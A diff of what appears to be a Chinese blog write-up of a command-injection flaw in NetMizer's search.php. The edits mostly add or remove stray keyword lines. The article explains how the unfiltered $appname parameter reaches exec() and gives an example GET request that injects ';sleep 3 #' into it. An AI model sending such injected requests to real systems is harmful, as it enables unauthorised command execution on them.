@@ -20,14 +20,6 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 # 漏洞分析
 
-深入探索
-
-WebService
-
-网络安全书籍
-
-Web安全工具包
-
 看下 `search.php` 业务实现关键逻辑部分
 
 ```
@@ -57,17 +49,11 @@ echo '{"success":true}';
 return;
 ```
 
-深入探索
-
-网络安全培训
-
-数据安全咨询
-
-虚拟化安全解决方案
-
 当 `$action = 'addtask'` 时，用户可控参数 `$appname` （变量覆盖）直接用于构建命令行字符串 `$cmd`，并通过 `exec($cmd)` 执行。该参数未经过充分过滤或转义，造成[命令注入](https://mrxn.net/tag/rce)漏洞。
 
 同样当 `$action = 'showtask'` 时，也存在同样的命令注入漏洞
+
+计算机安全
 
 ```
 else if($action == 'showtask'){
@@ -110,6 +96,8 @@ else if($action == 'showtask'){
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
+
+网络
 
 ```
 GET /data/search/search.php?action=addtask&appname=search;sleep+3+%23 HTTP/1.1
